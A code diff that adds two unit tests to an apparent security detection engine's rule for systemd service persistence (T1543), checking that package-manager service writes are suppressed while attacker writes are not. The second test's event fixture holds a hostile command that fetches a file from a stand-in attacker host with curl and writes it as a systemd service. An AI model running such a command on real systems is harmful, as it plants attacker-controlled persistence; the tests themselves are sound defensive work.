@@ -142,6 +142,55 @@ def test_t1543_no_match_benign_service_file_write(engine):
     assert t1543 is None or t1543.matched is False
 
 
+def test_t1543_package_manager_maintainer_script_suppressed(engine):
+    """A dpkg maintainer script running `sh -c` touches the rule (shell process)
+    but is suppressed as benign package-manager activity."""
+    event = {
+        "event": {"category": "file", "type": "change", "action": "created"},
+        "file": {
+            "path": "/etc/systemd/system/myapp.service",
+            "name": "myapp.service",
+        },
+        "process": {
+            "name": "sh",
+            "command_line": "sh -c 'systemctl daemon-reload'",
+            "parent": {"name": "dpkg"},
+        },
+        "user": {"name": "root"},
+        "host": {"name": "dev-vps"},
+    }
+    candidates = engine.evaluate_event(event)
+    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
+    assert t1543 is not None
+    assert t1543.matched is True
+    assert t1543.suppressed is True
+    assert t1543.suppression_id == "benign_package_manager_service_write"
+
+
+def test_t1543_attacker_service_write_not_suppressed(engine):
+    """An attacker writing a service file via curl in a shell must NOT be
+    suppressed even though a shell is involved."""
+    event = {
+        "event": {"category": "file", "type": "change", "action": "created"},
+        "file": {
+            "path": "/etc/systemd/system/evil.service",
+            "name": "evil.service",
+        },
+        "process": {
+            "name": "bash",
+            "command_line": "bash -c 'curl http://attacker/x > /etc/systemd/system/evil.service'",
+            "parent": {"name": "sshd"},
+        },
+        "user": {"name": "root"},
+        "host": {"name": "dev-vps"},
+    }
+    candidates = engine.evaluate_event(event)
+    t1543 = next((c for c in candidates if c.rule_id == RULE_ID), None)
+    assert t1543 is not None
+    assert t1543.matched is True
+    assert t1543.suppressed is False
+
+
 # ---------------------------------------------------------------------------
 # Metadata test
 # ---------------------------------------------------------------------------
